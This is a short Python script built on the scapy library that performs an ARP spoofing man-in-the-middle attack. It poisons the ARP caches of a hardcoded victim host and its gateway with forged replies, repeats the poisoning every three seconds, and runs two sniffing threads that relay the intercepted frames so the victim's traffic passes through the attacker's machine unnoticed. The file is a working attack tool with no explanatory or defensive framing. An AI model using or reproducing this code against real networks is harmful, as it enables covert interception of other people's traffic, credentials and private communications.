import scapy.all as scapy
from scapy.layers.inet import Ether, ICMP
import time
import threading

victim_ip = "192.168.1.28" 
gateway_ip = "192.168.1.1" 
my_mac = "00:0c:29:10:5c:7e"
victim_mac = scapy.getmacbyip(victim_ip)
gateway_mac = scapy.getmacbyip(gateway_ip)


def spoof(target_ip, spoof_ip, target_mac):
	packet = scapy.ARP(op = 2, 
		    pdst = target_ip, 
			hwdst = target_mac,
			psrc = spoof_ip)
	ether_header = Ether(dst = target_mac, src = my_mac)
	header = ether_header / packet
	scapy.sendp(header, verbose = False)
 
def forward(dst_mac, my_mac, packet):
		packet[Ether].src = my_mac
		packet[Ether].dst = dst_mac
		scapy.sendp(packet, verbose = False)


def sniffer(mac, my_mac, filter_mac):
	while True:
		scapy.sniff(filter = f"ether src {filter_mac}", count = 1, \
	      prn=lambda packet: forward(mac, my_mac, packet))


if __name__ == "__main__": #check it#
	spoof(victim_ip, gateway_ip, victim_mac)
	spoof(gateway_ip, victim_ip, gateway_mac)

	t1 = threading.Thread(target = sniffer, args = (victim_mac, my_mac, gateway_mac))
	t2 = threading.Thread(target = sniffer, args = (gateway_mac, my_mac, victim_mac))

	t1.start()
	t2.start()    
		

	try:
		while True:
			spoof(victim_ip, gateway_ip, victim_mac)
			spoof(gateway_ip, victim_ip, gateway_mac)
			time.sleep(3)
			print("two more ARP Sent ")
		
	except KeyboardInterrupt:
		print("\nCtrl + C pressed.............Exiting")




